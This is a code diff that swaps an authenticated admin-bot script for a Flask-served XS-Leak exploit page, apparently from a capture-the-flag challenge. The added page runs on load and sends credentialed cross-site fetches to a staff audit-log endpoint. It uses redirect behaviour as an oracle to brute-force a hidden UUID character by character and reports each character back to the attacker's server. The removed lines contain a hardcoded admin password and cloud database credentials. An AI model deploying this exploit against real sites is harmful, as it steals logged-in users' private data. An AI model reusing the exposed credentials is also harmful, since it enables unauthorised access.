@@ -1,162 +1,128 @@
-#!/usr/bin/env python3
+import urllib.parse
+from flask import Flask, render_template_string, request
+
+app = Flask(__name__)
+
+# CONFIGURATION
+TARGET_BASE = "https://web.crypto.x-0r.com/"
+KNOWN_ID = ""
+
+HTML = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XS-Leak Redirect Solver (Fetch Mode)</title>
+</head>
+<body style="background: #1a1a1a; color: #00ff00; font-family: 'Courier New', monospace; padding: 40px;">
+    <h1 style="border-bottom: 2px solid #00ff00;">> REDIRECT_FETCH_EXPLOIT.EXE</h1>
+    <button id="startBtn" style="padding: 15px 30px; background: #00ff00; color: #000; border: none; font-weight: bold; cursor: pointer; margin: 20px 0;">
+        EXECUTE BRUTEFORCE
+    </button>
+
+    <div style="background: #000; padding: 20px; border-radius: 5px; margin-top: 20px;">
+        <div id="status" style="margin-bottom: 10px; color: #888;">Status: Awaiting user gesture...</div>
+        <div id="uuid" style="font-size: 28px; letter-spacing: 2px;">UUID: <span id="leaked"></span></div>
+    </div>
+
+    <script>
+        const CHARSET = "0123456789abcdef";
+        let leaked = ""; 
+
+        async function probe(prefix) {
+            const params = new URLSearchParams({
+                "Action": "Created Case",
+                "TargetId": "{{ target_id }}",
+                "Staff__Department__Name__Staff__CreatedFiles__IsPublished": "0",
+                "Staff__Department__Name__Staff__CreatedFiles__Uuid__startswith": prefix
+            });
+
+            const targetUrl = `{{ target_base }}/staff/auditlog?${params.toString()}`;
+
+            try {
+                // Using no-cors and redirect: manual gives us an 'opaqueredirect' type 
+                // if the server tries to redirect us.
+                const response = await fetch(targetUrl, {
+                    method: 'GET',
+                    mode: 'no-cors',
+                    credentials: 'include', // Exploits the SameSite=None configuration
+                    redirect: 'manual' 
+                });
+
+                // MATCH CASE:
+                // The server issued a redirect (e.g., 302 Found)
+                if (response.type === 'opaqueredirect') {
+                    return true;
+                }
+                
+                // MISS CASE:
+                // The server returned a standard HTTP response (e.g., 200 OK)
+                return false;
+
+            } catch (e) {
+                console.error("Probe error:", e);
+                return false;
+            }
+        }
+
+        async function solve() {
+            document.getElementById("status").innerText = "Status: IN_PROGRESS...";
+
+            while (leaked.length < 36) {
+                // Handle UUID dashes
+                if ([8, 13, 18, 23].includes(leaked.length)) {
+                    leaked += "-";
+                    document.getElementById("leaked").innerText = leaked;
+                    continue;
+                }
+
+                let found = false;
+                for (let c of CHARSET) {
+                    document.getElementById("status").innerText = `Probing: ${leaked}${c}`;
+
+                    const isMatch = await probe(leaked + c);
+                    if (isMatch) {
+                        leaked += c;
+                        document.getElementById("leaked").innerText = leaked;
+
+                        // Send results back to the Python terminal
+                        fetch("/log?val=" + leaked);
+                        found = true;
+                        break;
+                    }
+                }
+
+                if (!found) {
+                    document.getElementById("status").innerText = "Status: STALLED (No Match Found)";
+                    break;
+                }
+            }
+            
+            if (leaked.length === 36) {
+                document.getElementById("status").innerText = "Status: COMPLETE.";
+            }
+        }
+
+        // Runs automatically when the page loads
+        window.onload = () => {
+            console.log("Auto-starting exploit...");
+            solve();
+        };
+    </script>
+</body>
+</html>
 """
-XS-Leaks Bot - Authenticated Staff Visitor (Playwright Version)
-"""
 
-import asyncio
-import os
-import pymysql
-from pymysql.cursors import DictCursor
-from playwright.async_api import async_playwright
+@app.route("/")
+def index():
+    return render_template_string(
+        HTML, target_base=TARGET_BASE, target_id=KNOWN_ID
+    )
 
-# --- Configuration ---
-BASE_URL = os.environ.get("BASE_URL", "http://192.168.0.152:8111")
-LOGIN_URL = f"{BASE_URL}/staff/login"
-
-ADMIN_USER = "admin"
-ADMIN_PASS = "HamaGhrab4chrab"
-
-DB = {
-    "host": "gateway01.eu-central-1.prod.aws.tidbcloud.com",
-    "port": 4000,
-    "user": "28g7uo7XM1BNj1c.root",
-    "password": "FxCvYxQAZoanwx5s",
-    "database": "test",
-    "ssl": {"ca": "/etc/ssl/certs/ca-certificates.crt"},
-    "cursorclass": DictCursor,
-    "autocommit": True,
-}
-
-
-def get_report(conn):
-    """Fetch the oldest report from the database."""
-    with conn.cursor() as cur:
-        cur.execute("SELECT id, url FROM report ORDER BY created_at ASC LIMIT 1")
-        return cur.fetchone()
-
-
-def delete_report(conn, rid):
-    """Delete a report after visiting."""
-    with conn.cursor() as cur:
-        cur.execute("DELETE FROM report WHERE id = %s", (rid,))
-        conn.commit()
-
-
-async def login(context):
-    """
-    Authenticates the browser context as the admin user.
-    """
-    page = await context.new_page()
-    print(f"[*] Navigating to login: {LOGIN_URL}")
-
-    try:
-        await page.goto(LOGIN_URL, wait_until="networkidle")
-        await page.fill('input[name="username"]', ADMIN_USER)
-        await page.fill('input[name="password"]', ADMIN_PASS)
-        
-        print("[*] Submitting credentials...")
-        await asyncio.gather(
-            page.wait_for_navigation(wait_until="networkidle"),
-            page.click('button[type="submit"]')
-        )
-
-        content = await page.content()
-        if "Staff Area" in content or "Audit Detail" in content:
-            print("[+] Login successful! Session active.", flush=True)
-            return True
-        else:
-            print(f"[!] Warning: Login might have failed. Current URL: {page.url}")
-            return False
-
-    except Exception as e:
-        print(f"[!] Login Exception: {e}")
-        return False
-    finally:
-        await page.close()
-
-
-async def visit(context, url):
-    """
-    Visits a reported URL using the authenticated browser context.
-    """
-    page = await context.new_page()
-    try:
-        print(f"[+] Visiting: {url}")
-        page.on("console", lambda msg: print(f"[BROWSER] {msg.text}"))
-        
-        # In Playwright, popups are handled via context.on("page")
-        # For this exploit, we just need to make sure they are NOT blocked.
-        # Playwright by default doesn't block them if they're scripted.
-        
-        await page.goto(url, wait_until="networkidle", timeout=60000)
-
-        # Wait for the exploit to run
-        print("[*] Waiting for exploit (180s)...")
-        await asyncio.sleep(180)
-
-        print("[+] Visit complete")
-        return True
-    except Exception as e:
-        print(f"[!] Visit Error: {e}")
-        return False
-    finally:
-        await page.close()
-
-
-async def main():
-    print("[*] Connecting to DB...")
-    try:
-        conn = pymysql.connect(**DB)
-    except Exception as e:
-        print(f"[!] Database connection failed: {e}")
-        return
-    print("[*] DB Connected")
-
-    async with async_playwright() as p:
-        print("[*] Launching browser...")
-        browser = await p.chromium.launch(
-            headless=True,
-            executable_path=os.environ.get("PUPPETEER_EXECUTABLE_PATH", "/usr/bin/chromium"),
-            args=[
-                "--no-sandbox",
-                "--disable-web-security",
-                "--disable-features=IsolateOrigins,site-per-process",
-                "--allow-popups-during-page-unload"
-            ]
-        )
-        
-        # Create a context that acts like a normal browser session
-        context = await browser.new_context(
-            viewport={'width': 1200, 'height': 800},
-            ignore_https_errors=True
-        )
-        print("[*] Browser Context Ready")
-
-        # --- AUTHENTICATE ---
-        if not await login(context):
-            print("[!] Authentication failed. Exiting.")
-            await browser.close()
-            return
-        # --------------------
-
-        print("[*] Starting report monitor loop...")
-        while True:
-            try:
-                conn.ping(reconnect=True)
-                report = get_report(conn)
-
-                if not report:
-                    await asyncio.sleep(3)
-                    continue
-
-                await visit(context, report["url"])
-                delete_report(conn, report["id"])
-                print(f"[+] Processed & Deleted Report ID: {report['id']}")
-
-            except Exception as e:
-                print(f"[!] Loop Exception: {e}")
-                await asyncio.sleep(3)
-
+@app.route("/log")
+def log():
+    val = request.args.get("val")
+    print(f"\n[+] PROGRESS: {val}")
+    return "ok"
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    app.run(host="0.0.0.0", port=5000)
